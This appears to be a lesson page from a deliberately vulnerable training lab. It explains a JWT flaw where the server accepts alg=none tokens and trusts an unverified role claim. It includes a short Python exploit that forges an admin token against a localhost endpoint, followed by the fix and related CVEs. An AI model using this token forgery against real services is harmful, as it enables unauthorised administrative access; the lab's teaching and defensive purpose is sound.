# 03 — Broken auth: alg=none / forged role

**Category:** Authorization · **MASVS-AUTH-2** · **Difficulty:** medium

## The flaw
`GET /api/admin` reads a JWT from the `Authorization: Bearer` header and trusts
the `role` claim **without verifying the signature**, and it honors tokens with
`"alg": "none"`. An attacker forges a token with any claims they like.

## Exploit
```python
import base64, json, urllib.request
b = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
tok = f"{b({'alg':'none','typ':'JWT'})}.{b({'sub':'attacker','role':'admin'})}."
req = urllib.request.Request("http://127.0.0.1:8000/api/admin",
                             headers={"Authorization": f"Bearer {tok}"})
print(urllib.request.urlopen(req).read())   # flag in "secret"
```

## Fix
Reject `alg=none`. Verify the signature with a server-held key (HS256 secret or
RS256 public key) before reading any claim. Pin the expected algorithm — never
let the token's own header choose it.

## Real-world CVE context (CWE-347)

Signature-verification failures (alg confusion, `alg=none`, forged tokens) are a
well-trodden path to auth bypass. All ids resolve in the bundled offline OSV DB:

| CVE | Project | What broke |
|-----|---------|------------|
| `CVE-2015-9235` | `jsonwebtoken` (npm) | Verification bypass via algorithm confusion |
| `CVE-2015-10004` | `robbert229/jwt` (Go) | Token validation methods could be bypassed |
| `CVE-2023-22463` | KubePi | Login with a forged JWT token |
| `CVE-2026-48031` | Go API boilerplate | Hard-coded JWT secret `"random"` → forgeable tokens |

```bash
dvmobile cve CVE-2015-9235
dvmobile enrich jwt-none
```

The lab's `/api/admin` reproduces the worst case: the token's own header is
trusted to pick the algorithm, and the signature is never verified.
